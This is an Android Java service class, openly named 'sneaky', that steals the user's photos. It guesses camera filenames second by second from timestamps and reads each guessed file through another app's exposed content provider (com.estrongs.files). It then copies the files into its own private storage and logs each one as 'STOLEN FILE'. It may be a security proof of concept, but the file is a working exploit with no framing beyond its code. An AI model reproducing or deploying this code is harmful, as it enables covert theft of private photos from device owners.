package com.mk.cryptobox.sneaky;

import android.app.IntentService;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Log;

import org.joda.time.DateTime;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;


/**
 * Created by mk on 15.04.2016.
 */
public class PhotoScanService extends IntentService
{
    private static final String SD_CARD = Environment.getExternalStorageDirectory().getPath();
    private static final String PREFIX = SD_CARD + "/DCIM/Camera/";
    private static final String LAST_READ_TIME = "last_read_time";
    private static final String ES_FILE_EXPLORER_FILE_URI = "content://com.estrongs.files/";

    public PhotoScanService()
    {
        super("PhotoScanService");
    }

    @Override
    protected void onHandleIntent(Intent intent)
    {
        Log.d("_MK", "PhotoScanService started");

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(PhotoScanService.this);
        String lastReadTime = prefs.getString(LAST_READ_TIME, null);
        DateTime startDate = TimeOps.nowInLocalTime();
        DateTime endDate;
        if (lastReadTime == null)
        {
            endDate = startDate.minusDays(1);
        }
        else
        {
            endDate = TimeOps.parse(lastReadTime);
        }

        DateTime currentDate = startDate;
        while (currentDate.isAfter(endDate))
        {
            String imageName = constructPhotoFileName(currentDate);
            lookupForFile(imageName);
            currentDate = currentDate.minusSeconds(1);
        }

        SharedPreferences.Editor editor = prefs.edit();
        editor.putString(LAST_READ_TIME, TimeOps.print(startDate));
        editor.apply();

        Log.d("_MK", "COMPLETED.");
    }

    public static String constructPhotoFileName(DateTime date)
    {
        StringBuilder sb = new StringBuilder();
        sb.append(TimeOps.print(date));
        sb.append(".jpg");
        return sb.toString();
    }

    private void lookupForFile(final String fileName)
    {
        InputStream in = null;
        OutputStream out = null;

        try
        {
            Uri uri = Uri.parse(ES_FILE_EXPLORER_FILE_URI + PREFIX + fileName);

            //throws exception if file does not exist
            in = PhotoScanService.this.getApplicationContext().getContentResolver().openInputStream(uri);

            String destinationFilename = PhotoScanService.this.getFilesDir().getPath() + File.separator + fileName;
            out = new FileOutputStream(destinationFilename);
            byte[] buf = new byte[1024];
            int len;
            while ((len = in.read(buf)) > 0)
            {
                out.write(buf, 0, len);
            }

            Log.d("_MK", "STOLEN FILE: " + destinationFilename);
        }
        catch (FileNotFoundException e)
        {
            Log.d("_MK", "NOT_FOUND: " + fileName);
        }
        catch (IOException e)
        {
            //Log.e("_MK", "io-problem", e);
        }
        finally
        {
            try
            {
                if (out != null)
                {
                    out.close();
                }
                if (in != null)
                {
                    in.close();
                }
            }
            catch (Exception ex)
            {
                //Log.e("_MK", "io-problem", ex);
            }
        }
    }
}
